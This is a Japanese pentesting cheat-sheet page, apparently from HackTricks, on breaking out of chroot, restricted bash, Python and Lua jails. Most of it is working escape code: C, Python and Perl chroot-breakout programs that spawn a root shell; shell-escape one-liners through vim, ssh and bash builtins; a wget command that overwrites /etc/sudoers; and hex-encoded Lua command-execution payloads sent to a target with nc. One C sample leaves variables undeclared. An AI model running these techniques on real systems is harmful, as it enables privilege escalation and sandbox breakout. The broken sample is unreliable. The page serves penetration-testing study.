# ジェイルからの脱出

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**"Shell" プロパティを持つバイナリを実行できるかどうか、[**https://gtfobins.github.io/**](https://gtfobins.github.io) で検索してください**

## Chroot エスケープ

[ウィキペディア](https://en.wikipedia.org/wiki/Chroot#Limitations)より: chroot メカニズムは **特権のある** (**root**) **ユーザーによる意図的な改ざんに対して防御することを目的としていません**。ほとんどのシステムでは、chroot コンテキストは正しくスタックされず、十分な特権を持つ chroot プログラムは **二度目の chroot を実行して脱出することができます**。\
通常、脱出するには chroot 内で root である必要があります。

> [!TIP]
> **ツール** [**chw00t**](https://github.com/earthquake/chw00t) は、次のシナリオを悪用して `chroot` から脱出するために作成されました。

### Root + CWD

> [!WARNING]
> chroot 内で **root** である場合、**別の chroot** を作成することで **脱出** できます。これは、2 つの chroot が共存できないため (Linux では)、フォルダーを作成し、その新しいフォルダー上に **新しい chroot を作成** すると、**その外にいるあなた** は **新しい chroot の外にいることになり**、したがってファイルシステム内にいることになります。
>
> これは通常、chroot が作業ディレクトリを指定された場所に移動しないために発生します。したがって、chroot を作成できますが、その外にいることになります。

通常、chroot ジェイル内には `chroot` バイナリは見つかりませんが、**バイナリをコンパイル、アップロード、実行することができます**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> これは前のケースに似ていますが、この場合、**攻撃者は現在のディレクトリへのファイルディスクリプタを保存し**、その後**新しいフォルダにchrootを作成します**。最後に、**chrootの外部でそのFDにアクセスできるため**、それにアクセスし、**脱出**します。

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FDはUnix Domain Socketsを介して渡すことができるので：
>
> - 子プロセスを作成する（fork）
> - 親と子が通信できるようにUDSを作成する
> - 子プロセスで異なるフォルダ内でchrootを実行する
> - 親プロセスで、新しい子プロセスのchrootの外にあるフォルダのFDを作成する
> - UDSを使用してそのFDを子プロセスに渡す
> - 子プロセスはそのFDにchdirし、chrootの外にいるため、脱出することができる

### Root + Mount

> [!WARNING]
>
> - ルートデバイス（/）をchroot内のディレクトリにマウントする
> - そのディレクトリにchrootする
>
> これはLinuxで可能です

### Root + /proc

> [!WARNING]
>
> - procfsをchroot内のディレクトリにマウントする（まだであれば）
> - 異なるroot/cwdエントリを持つpidを探す、例えば：/proc/1/root
> - そのエントリにchrootする

### Root(?) + Fork

> [!WARNING]
>
> - フォーク（子プロセス）を作成し、FSのより深い異なるフォルダにchrootし、その上でCDする
> - 親プロセスから、子プロセスがいるフォルダを子のchrootの前のフォルダに移動する
> - この子プロセスはchrootの外にいることになる

### ptrace

> [!WARNING]
>
> - 以前はユーザーが自分のプロセスを自分のプロセスからデバッグできましたが... これはもはやデフォルトでは不可能です
> - それでも、可能であれば、プロセスにptraceし、その中でシェルコードを実行することができます（[この例を参照](linux-capabilities.md#cap_sys_ptrace)）。

## Bash Jails

### Enumeration

監獄に関する情報を取得する：
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATHを変更する

PATH環境変数を変更できるか確認してください。
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vimの使用
```bash
:set shell=/bin/sh
:shell
```
### スクリプトを作成

_/bin/bash_ を内容とする実行可能ファイルを作成できるか確認してください。
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSHからbashを取得する

ssh経由でアクセスしている場合、このトリックを使用してbashシェルを実行できます：
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### 宣言
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

例えば、sudoersファイルを上書きすることができます。
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### その他のトリック

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/**](https/gtfobins.github.io)\
**ページも興味深いかもしれません:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python ジェイル

次のページで Python ジェイルからの脱出に関するトリックがあります:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua ジェイル

このページでは、lua 内でアクセスできるグローバル関数を見つけることができます: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**コマンド実行を伴う Eval:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
ライブラリの**関数をドットを使わずに呼び出す**ためのいくつかのトリック：
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
ライブラリの関数を列挙する:
```bash
for k,v in pairs(string) do print(k,v) end
```
注意してください。前のワンライナーを**異なるlua環境で実行するたびに関数の順序が変わります**。したがって、特定の関数を実行する必要がある場合は、異なるlua環境をロードしてleライブラリの最初の関数を呼び出すことでブルートフォース攻撃を行うことができます。
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**インタラクティブなluaシェルを取得する**: 制限されたluaシェル内にいる場合は、次のように呼び出すことで新しいluaシェル（できれば無制限）を取得できます:
```bash
debug.debug()
```
## 参考文献

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (スライド: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))

{{#include ../../banners/hacktricks-training.md}}
